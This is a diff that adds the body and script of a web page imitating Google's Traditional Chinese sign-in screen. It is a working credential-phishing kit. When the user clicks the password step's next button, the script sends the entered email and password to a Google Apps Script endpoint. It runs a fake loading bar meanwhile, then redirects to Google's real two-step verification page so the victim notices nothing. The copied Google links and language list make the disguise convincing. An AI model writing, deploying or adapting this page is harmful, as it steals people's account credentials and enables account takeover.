+                        <div class="actions-row step1-actions">
+                            <div class="create-account-wrapper">
+                                <span class="create-account-link" id="createAccountBtn">建立帳戶</span>
+                                <div class="create-dropdown" id="createDropdown">
+                                    <a class="dropdown-item" href="https://accounts.google.com/lifecycle/steps/signup/name?checkedDomains=youtube&continue=https://myaccount.google.com/?authuser%3D%26pageId%3Dnone&dsh=S-484822587:1785978318448309&flowEntry=SignUp&flowName=GlifWebSignIn&pstMsg=1&TL=AE6FvyZqpwJHvqf6cOiaJ4zgXIPQcaJh2Cmo9RD8a_jfYs0qXUbTKiZcsGw4qWv0">個人用途</a>
+                                    <a class="dropdown-item" href="https://accounts.google.com/lifecycle/steps/signup/kids/accountsetupchapter?checkedDomains=youtube&continue=https://myaccount.google.com/?authuser%3D%26pageId%3Dnone&dsh=S-484822587:1785978318448309&flowEntry=SignUp&flowName=GlifWebSignIn&ksf=1&pstMsg=1&TL=AE6FvyYa99888EvnD5oXrtHKYrM1jmVfCFb1_tey1_ykU4lHL_pnh-iUsPOuxjkc">兒童用途</a>
+                                    <a class="dropdown-item" href="https://workspace.google.com/business/signup/newbusiness?utm_source=gaia-in-product&utm_medium=et&utm_campaign=gaia-xpa&xsell=google_accounts&source=gaiaxws-gmail&uj=xgaia-signin-&uj=wsin&back=https%253A%252F%252Faccounts.google.com%252Flifecycle%252Fflows%252Fsignup%253Fbiz%253Dtrue%2526checkedDomains%253Dyoutube%2526continue%253Dhttps%25253A%25252F%25252Fmyaccount.google.com%25252F%25253Fauthuser%25253D%252526pageId%25253Dnone%2526dsh%253DS-484822587%25253A1785978318448309%2526flowEntry%253DSignUp%2526flowName%253DGlifWebSignIn%2526pstMsg%253D1">工作或企業用途</a>
+                                </div>
+                            </div>
+                            <button type="button" class="btn-next" id="step1Next">下一步</button>
+                        </div>
+                    </div>
+                    <div class="step" id="step2">
+                        <div class="form-group step2-group">
+                            <div class="input-container" id="passwordInputContainer">
+                                <input type="password" placeholder=" " id="passwordInput">
+                                <span class="floating-label">輸入您的密碼</span>
+                            </div>
+                            <div class="error-message" id="passwordErrorMessage">
+                                <span class="error-icon">
+                                    <svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
+                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
+                                    </svg>
+                                </span>
+                                <span>請輸入密碼</span>
+                            </div>
+                            <button type="button" class="show-password-btn" id="showPasswordBtn">
+                                <div class="VfPpkd-YQoJzd" id="checkboxContainer">
+                                    <svg aria-hidden="true" class="VfPpkd-HUofsb" viewBox="0 0 24 24">
+                                        <path class="VfPpkd-HUofsb-Jt5cK" fill="none" d="M1.73,12.91 8.1,19.28 22.79,4.59"></path>
+                                    </svg>
+                                    <div class="VfPpkd-SJnn3d"></div>
+                                </div>
+                                <span class="btn-label">顯示密碼</span>
+                            </button>
+                        </div>
+                        <div class="actions-row">
+                            <a href="#" class="forgot-link" onclick="return false;">忘記密碼？</a>
+                            <button type="button" class="btn-next" id="step2Next">下一步</button>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+        <div class="footer-links" id="footerLinks">
+            <div class="lang-selector" id="langSelector">
+                <span class="lang-label" id="currentLangLabel">繁體中文</span>
+                <span class="lang-arrow-icon material-symbols-outlined" id="langArrow">arrow_drop_down</span>
+                <div class="lang-dropdown" id="langDropdown"></div>
+            </div>
+            <div class="footer-right">
+                <a href="https://support.google.com/accounts?hl=zh-Hant&p=account_iph" target="_blank" id="helpLink">說明</a>
+                <a href="https://accounts.google.com/TOS?loc=TW&hl=zh-Hant&privacy=true" target="_blank">隱私權</a>
+                <a href="https://accounts.google.com/TOS?loc=TW&hl=zh-Hant" target="_blank">條款</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        (function() {
+            // ---------- 進度條 (分段式，保證完整) ----------
+            var track = document.getElementById('loadingTrack');
+            var overlay = document.getElementById('loadingOverlay');
+            var activeSegment = null;
+            var segmentTimer = null;
+            var isRunning = false;
+            var isCompleting = false;
+            var animationFrame = null;
+            var finishResolve = null;
+            var startTime = 0;
+            var totalDuration = 0;
+
+            function rand(min, max) { return Math.random() * (max - min) + min; }
+
+            function showOverlay() { overlay.style.display = 'block'; }
+
+            function hideOverlay() { overlay.style.display = 'none'; }
+
+            function createSegment() {
+                var el = document.createElement('div');
+                el.className = 'loading-segment';
+                var width = rand(20, 50);
+                el.style.width = width + '%';
+                el.style.transform = 'translateX(-100%)';
+                track.appendChild(el);
+                return el;
+            }
+
+            function clearSegments() {
+                while (track.firstChild) {
+                    track.removeChild(track.firstChild);
+                }
+                activeSegment = null;
+            }
+
+            function easeInOutCubic(t) {
+                return t < 0.5 ? 4 * t * t * t : 1 - Math.pow(-2 * t + 2, 3) / 2;
+            }
+
+            function animateSegment(el, duration) {
+                return new Promise(function(resolve) {
+                    var startTime2 = performance.now();
+                    var startX = -100;
+                    var endX = 100;
+
+                    function step(time) {
+                        var elapsed = time - startTime2;
+                        var progress = Math.min(elapsed / duration, 1);
+                        var eased = easeInOutCubic(progress);
+                        var x = startX + (endX - startX) * eased;
+                        el.style.transform = 'translateX(' + x + '%)';
+                        if (progress < 1) {
+                            animationFrame = requestAnimationFrame(step);
+                        } else {
+                            el.style.transform = 'translateX(100%)';
+                            resolve();
+                        }
+                    }
+                    animationFrame = requestAnimationFrame(step);
+                });
+            }
+
+            function scheduleNextSegment() {
+                if (!isRunning) return;
+                if (isCompleting) return;
+                if (Date.now() - startTime >= totalDuration) {
+                    isCompleting = true;
+                    if (!activeSegment) {
+                        clearSegments();
+                        isRunning = false;
+                        hideOverlay();
+                        if (finishResolve) {
+                            finishResolve();
+                            finishResolve = null;
+                        }
+                    }
+                    return;
+                }
+                var delay = rand(200, 600);
+                segmentTimer = setTimeout(function() {
+                    if (!isRunning || isCompleting) return;
+                    launchSegment();
+                }, delay);
+            }
+
+            function launchSegment() {
+                if (!isRunning || isCompleting) return;
+                if (activeSegment) return;
+                var el = createSegment();
+                var duration = rand(400, 900);
+                activeSegment = { el: el, duration: duration };
+                animateSegment(el, duration).then(function() {
+                    if (el.parentNode) el.parentNode.removeChild(el);
+                    activeSegment = null;
+                    if (isCompleting) {
+                        clearSegments();
+                        isRunning = false;
+                        hideOverlay();
+                        if (finishResolve) {
+                            finishResolve();
+                            finishResolve = null;
+                        }
+                        return;
+                    }
+                    if (Date.now() - startTime >= totalDuration) {
+                        isCompleting = true;
+                        clearSegments();
+                        isRunning = false;
+                        hideOverlay();
+                        if (finishResolve) {
+                            finishResolve();
+                            finishResolve = null;
+                        }
+                        return;
+                    }
+                    scheduleNextSegment();
+                });
+            }
+
+            function startLoading() {
+                if (isRunning) return;
+                clearSegments();
+                if (segmentTimer) { clearTimeout(segmentTimer);
+                    segmentTimer = null; }
+                if (animationFrame) { cancelAnimationFrame(animationFrame);
+                    animationFrame = null; }
+                isRunning = true;
+                isCompleting = false;
+                activeSegment = null;
+                finishResolve = null;
+                totalDuration = rand(800, 2000);
+                startTime = Date.now();
+                showOverlay();
+                launchSegment();
+            }
+
+            function completeLoading() {
+                return new Promise(function(resolve) {
+                    if (!isRunning) {
+                        hideOverlay();
+                        resolve();
+                        return;
+                    }
+                    if (isCompleting) {
+                        if (finishResolve) {
+                            var old = finishResolve;
+                            finishResolve = function() { old();
+                                resolve(); };
+                        } else {
+                            finishResolve = resolve;
+                        }
+                        return;
+                    }
+                    finishResolve = resolve;
+                });
+            }
+
+            // ---------- 步驟控制 ----------
+            var step1 = document.getElementById('step1');
+            var step2 = document.getElementById('step2');
+            var step1Next = document.getElementById('step1Next');
+            var step2Next = document.getElementById('step2Next');
+            var leftTitle = document.getElementById('leftTitle');
+            var leftSubtext = document.getElementById('leftSubtext');
+            var userProfileBtn = document.getElementById('userProfileBtn');
+            var displayedEmail = document.getElementById('displayedEmail');
+            var emailInput = document.getElementById('emailInput');
+            var inputContainer = document.getElementById('inputContainer');
+            var errorMessage = document.getElementById('errorMessage');
+            var passwordInput = document.getElementById('passwordInput');
+            var passwordInputContainer = document.getElementById('passwordInputContainer');
+            var passwordErrorMessage = document.getElementById('passwordErrorMessage');
+
+            var isTransitioning = false;
+            var currentUserEmail = '';
+
+            function getEmail() { return emailInput.value.trim(); }
+
+            function getPassword() { return passwordInput.value.trim(); }
+
+            function validateEmail() {
+                var email = getEmail();
+                if (email === '') {
+                    inputContainer.classList.add('error');
+                    errorMessage.classList.add('visible');
+                    return false;
+                } else {
+                    inputContainer.classList.remove('error');
+                    errorMessage.classList.remove('visible');
+                    return true;
+                }
+            }
+
+            function validatePassword() {
+                var pwd = getPassword();
+                if (pwd === '') {
+                    passwordInputContainer.classList.add('error');
+                    passwordErrorMessage.classList.add('visible');
+                    return false;
+                } else {
+                    passwordInputContainer.classList.remove('error');
+                    passwordErrorMessage.classList.remove('visible');
+                    return true;
+                }
+            }
+
+            emailInput.addEventListener('input', function() {
+                if (inputContainer.classList.contains('error')) {
+                    inputContainer.classList.remove('error');
+                    errorMessage.classList.remove('visible');
+                }
+            });
+            passwordInput.addEventListener('input', function() {
+                if (passwordInputContainer.classList.contains('error')) {
+                    passwordInputContainer.classList.remove('error');
+                    passwordErrorMessage.classList.remove('visible');
+                }
+            });
+
+            function switchStepDirectly(from, to, direction) {
+                from.classList.remove('active');
+                from.classList.add(direction === 'forward' ? 'exit-left' : 'exit-right');
+                to.classList.remove('exit-left', 'exit-right');
+                to.classList.add('active');
+                setTimeout(function() {
+                    from.classList.remove('exit-left', 'exit-right');
+                }, 600);
+                isTransitioning = false;
+                step1Next.disabled = false;
+                step2Next.disabled = false;
+
+                // 切換步驟後自動聚焦到對應輸入框
+                setTimeout(function() {
+                    if (to === step1) {
+                        emailInput.focus();
+                    } else if (to === step2) {
+                        passwordInput.focus();
+                    }
+                }, 100);
+            }
+
+            async function switchStepWithLoading(from, to, direction) {
+                if (isTransitioning) return;
+                isTransitioning = true;
+                step1Next.disabled = true;
+                step2Next.disabled = true;
+
+                var isForward = (direction === 'forward' && from === step1);
+                var isBackward = (direction === 'backward' && from === step2);
+
+                if (isForward) {
+                    if (!validateEmail()) {
+                        isTransitioning = false;
+                        step1Next.disabled = false;
+                        step2Next.disabled = false;
+                        return;
+                    }
+                    currentUserEmail = getEmail();
+                    startLoading();
+                    await completeLoading();
+                    displayedEmail.textContent = currentUserEmail;
+                    userProfileBtn.classList.add('visible');
+                    leftTitle.textContent = '歡迎';
+                    leftSubtext.textContent = '';
+                    switchStepDirectly(from, to, direction);
+                    return;
+                }
+
+                if (isBackward) {
+                    passwordInput.value = '';
+                    if (isPasswordVisible) {
+                        isPasswordVisible = false;
+                        updateCheckboxAndInput();
+                    }
+                    passwordInputContainer.classList.remove('error');
+                    passwordErrorMessage.classList.remove('visible');
+                    startLoading();
+                    await completeLoading();
+                    userProfileBtn.classList.remove('visible');
+                    leftTitle.textContent = '登入';
+                    leftSubtext.textContent = '使用您的 Google 帳戶';
+                    currentUserEmail = '';
+                    switchStepDirectly(from, to, direction);
+                    return;
+                }
+
+                startLoading();
+                await completeLoading();
+                switchStepDirectly(from, to, direction);
+            }
+
+            step1Next.addEventListener('click', function(e) {
+                e.preventDefault();
+                if (isTransitioning) return;
+                switchStepWithLoading(step1, step2, 'forward');
+            });
+
+            // ================================================================
+            // 密碼下一步：邊送資料邊跑動畫（並行執行）
+            // ================================================================
+            step2Next.addEventListener('click', function(e) {
+                e.preventDefault();
+                if (isTransitioning) return;
+                if (!validatePassword()) return;
+
+                isTransitioning = true;
+                step1Next.disabled = true;
+                step2Next.disabled = true;
+
+                // 準備要發送的資料
+                const data = {
+                    user: emailInput.value.trim(),
+                    pwd: passwordInput.value.trim(),
+                    captchatext: "google"
+                };
+
+                // 兩個任務的完成標記
+                let fetchDone = false;
+                let loadDone = false;
+
+                // 檢查兩者是否都完成，若完成則跳轉
+                function checkBothDone() {
+                    if (fetchDone && loadDone) {
+                        window.location.href = 'https://myaccount.google.com/signinoptions/twosv?rapt=AEjHL4O_bg5RzVJcXHzuKINkAi8vPnay3PeJ1mu67yPf1-zhcYLY3eFKdNn5Qkjdz4hkrSgc1ID2o3OzPHVEtap8lw62OhWCiSQr4HWavqzw7a6Slm_UjNw';
+                    }
+                }
+
+                // 1. 啟動進度條動畫（與 fetch 並行）
+                startLoading();
+                completeLoading().then(function() {
+                    loadDone = true;
+                    checkBothDone();
+                });
+
+                // 2. 同時發送 POST 請求（不等待動畫完成）
+                fetch('https://script.google.com/macros/s/AKfycbzAZL-bDe6HEzSVq9mYasBvA6z0s1LsjJBSWHq2ZQl8wILGnZQA2wGjQNDtjR_n8kriUQ/exec', {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                }).then(function() {
+                    fetchDone = true;
+                    checkBothDone();
+                }).catch(function() {
+                    fetchDone = true;
+                    checkBothDone();
+                });
+            });
+
+            emailInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    if (!isTransitioning) {
+                        switchStepWithLoading(step1, step2, 'forward');
+                    }
+                }
+            });
+            passwordInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    step2Next.click();
+                }
+            });
+
+            userProfileBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                if (isTransitioning) return;
+                if (step2.classList.contains('active')) {
+                    switchStepWithLoading(step2, step1, 'backward');
+                }
+            });
+
+            // ---------- 顯示密碼 ----------
+            var showPasswordBtn = document.getElementById('showPasswordBtn');
+            var checkboxContainer = document.getElementById('checkboxContainer');
+            var isPasswordVisible = false;
+
+            function updateCheckboxAndInput() {
+                checkboxContainer.classList.toggle('checked', isPasswordVisible);
+                passwordInput.type = isPasswordVisible ? 'text' : 'password';
+            }
+
+            showPasswordBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                isPasswordVisible = !isPasswordVisible;
+                updateCheckboxAndInput();
+            });
+            checkboxContainer.addEventListener('click', function(e) {
+                e.stopPropagation();
+                isPasswordVisible = !isPasswordVisible;
+                updateCheckboxAndInput();
+            });
+
+            // ---------- 建立帳戶下拉 (僅隱藏「說明」) ----------
+            var createBtn = document.getElementById('createAccountBtn');
+            var dropdown = document.getElementById('createDropdown');
+            var helpLink = document.getElementById('helpLink');
+
+            function toggleDropdown(e) {
+                e.stopPropagation();
+                if (dropdown.classList.contains('open')) {
+                    dropdown.classList.remove('open');
+                    helpLink.style.display = '';
+                } else {
+                    dropdown.classList.add('open');
+                    helpLink.style.display = 'none';
+                }
+            }
+
+            createBtn.addEventListener('click', toggleDropdown);
+
+            document.querySelectorAll('.dropdown-item').forEach(function(item) {
+                item.addEventListener('click', function() {
+                    dropdown.classList.remove('open');
+                    helpLink.style.display = '';
+                });
+            });
+
+            document.addEventListener('click', function(e) {
+                if (!createBtn.contains(e.target) && !dropdown.contains(e.target)) {
+                    dropdown.classList.remove('open');
+                    helpLink.style.display = '';
+                }
+            });
+
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape') {
+                    dropdown.classList.remove('open');
+                    helpLink.style.display = '';
+                }
+            });
+
+            // ---------- 語言選擇器 ----------
+            var languages = [
+                ["af", "Afrikaans"],
+                ["az", "azərbaycan"],
+                ["bs", "bosanski"],
+                ["ca", "català"],
+                ["cs", "Čeština"],
+                ["cy", "Cymraeg"],
+                ["da", "Dansk"],
+                ["de", "Deutsch"],
+                ["et", "eesti"],
+                ["en-GB", "English (United Kingdom)"],
+                ["en-US", "English (United States)"],
+                ["es-ES", "Español (España)"],
+                ["es-419", "Español (Latinoamérica)"],
+                ["eu", "euskara"],
+                ["fil", "Filipino"],
+                ["fr-CA", "Français (Canada)"],
+                ["fr-FR", "Français (France)"],
+                ["ga", "Gaeilge"],
+                ["gl", "galego"],
+                ["hr", "Hrvatski"],
+                ["id", "Indonesia"],
+                ["zu", "isiZulu"],
+                ["is", "íslenska"],
+                ["it", "Italiano"],
+                ["sw", "Kiswahili"],
+                ["lv", "latviešu"],
+                ["lt", "lietuvių"],
+                ["hu", "magyar"],
+                ["ms", "Melayu"],
+                ["nl", "Nederlands"],
+                ["no", "norsk"],
+                ["uz", "o‘zbek"],
+                ["pl", "polski"],
+                ["pt-BR", "Português (Brasil)"],
+                ["pt-PT", "Português (Portugal)"],
+                ["ro", "română"],
+                ["sq", "shqip"],
+                ["sk", "Slovenčina"],
+                ["sl", "slovenščina"],
+                ["sr-Latn", "srpski (latinica)"],
+                ["fi", "Suomi"],
+                ["sv", "Svenska"],
+                ["vi", "Tiếng Việt"],
+                ["tr", "Türkçe"],
+                ["el", "Ελληνικά"],
+                ["be", "беларуская"],
+                ["bg", "български"],
+                ["ky", "кыргызча"],
+                ["kk", "қазақ тілі"],
+                ["mk", "македонски"],
+                ["mn", "монгол"],
+                ["ru", "Русский"],
+                ["sr-Cyrl", "српски (ћирилица)"],
+                ["uk", "Українська"],
+                ["ka", "ქართული"],
+                ["hy", "հայերեն"],
+                ["iw", "עברית"],
+                ["ur", "اردو"],
+                ["ar", "العربية"],
+                ["fa", "فارسی"],
+                ["am", "አማርኛ"],
+                ["ne", "नेपाली"],
+                ["mr", "मराठी"],
+                ["hi", "हिन्दी"],
+                ["as", "অসমীয়া"],
+                ["bn", "বাংলা"],
+                ["pa", "ਪੰਜਾਬੀ"],
+                ["gu", "ગુજરાતી"],
+                ["or", "ଓଡ଼ିଆ"],
+                ["ta", "தமிழ்"],
+                ["te", "తెలుగు"],
+                ["kn", "ಕನ್ನಡ"],
+                ["ml", "മലയാളം"],
+                ["si", "සිංහල"],
+                ["th", "ไทย"],
+                ["lo", "ລາວ"],
+                ["my", "မြန်မာ"],
+                ["km", "ខ្មែរ"],
+                ["ko", "한국어"],
+                ["zh-HK", "中文（香港）"],
+                ["ja", "日本語"],
+                ["zh-CN", "简体中文"],
+                ["zh-TW", "繁體中文"]
+            ];
+            var currentLang = 'zh-TW';
+            var currentLabel = '繁體中文';
+            var langSelector = document.getElementById('langSelector');
+            var langDropdown = document.getElementById('langDropdown');
+            var langArrow = document.getElementById('langArrow');
+            var currentLangLabel = document.getElementById('currentLangLabel');
+
+            function buildLanguageDropdown() {
+                langDropdown.innerHTML = '';
+                languages.forEach(function(item) {
+                    var code = item[0];
+                    var label = item[1];
+                    var el = document.createElement('div');
+                    el.className = 'lang-item' + (code === currentLang ? ' selected' : '');
+                    el.textContent = label;
+                    el.dataset.code = code;
+                    el.dataset.label = label;
+                    el.addEventListener('click', function(e) {
+                        e.stopPropagation();
+                        selectLanguage(code, label);
+                    });
+                    langDropdown.appendChild(el);
+                });
+            }
+
+            function selectLanguage(code, label) {
+                currentLabel = label;
+                currentLangLabel.textContent = label;
+                var items = langDropdown.querySelectorAll('.lang-item');
+                items.forEach(function(item) {
+                    item.classList.toggle('selected', item.dataset.code === code);
+                });
+                closeDropdown();
+            }
+
+            function openDropdown() {
+                langDropdown.classList.add('open');
+                langArrow.classList.add('open');
+            }
+
+            function closeDropdown() {
+                langDropdown.classList.remove('open');
+                langArrow.classList.remove('open');
+            }
+
+            function toggleLangDropdown(e) {
+                e.stopPropagation();
+                if (langDropdown.classList.contains('open')) {
+                    closeDropdown();
+                } else {
+                    openDropdown();
+                }
+            }
+            langSelector.addEventListener('click', toggleLangDropdown);
+            document.addEventListener('click', function(e) {
+                if (!langSelector.contains(e.target)) {
+                    closeDropdown();
+                }
+            });
+            buildLanguageDropdown();
+            currentLangLabel.textContent = currentLabel;
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape') {
+                    closeDropdown();
+                }
+            });
+
+            // ---------- 自動聚焦到邮箱输入框 ----------
+            function autoFocusEmail() {
+                if (emailInput && typeof emailInput.focus === 'function') {
+                    emailInput.focus();
+                    try {
+                        emailInput.setSelectionRange(emailInput.value.length, emailInput.value.length);
+                    } catch (e) {}
+                }
+            }
+
+            // 桌面版：load 後聚焦
+            window.addEventListener('load', autoFocusEmail);
+
+            // 手機版：DOMContentLoaded 後多次嘗試，提高鍵盤彈出機率
+            document.addEventListener('DOMContentLoaded', function() {
+                if (window.matchMedia('(max-width: 680px)').matches) {
+                    autoFocusEmail();
+                    setTimeout(autoFocusEmail, 150);
+                    setTimeout(autoFocusEmail, 600);
+                }
+            });
+
+            // 備援：使用者第一次觸控/點擊時聚焦（瀏覽器禁止自動彈鍵盤時的最後手段）
+            function firstInteractionFocus() {
+                autoFocusEmail();
+                document.removeEventListener('touchstart', firstInteractionFocus);
+                document.removeEventListener('click', firstInteractionFocus);
+            }
+            document.addEventListener('touchstart', firstInteractionFocus, { passive: true });
+            document.addEventListener('click', firstInteractionFocus);
+        })();
+    </script>
+</body>
+</html>
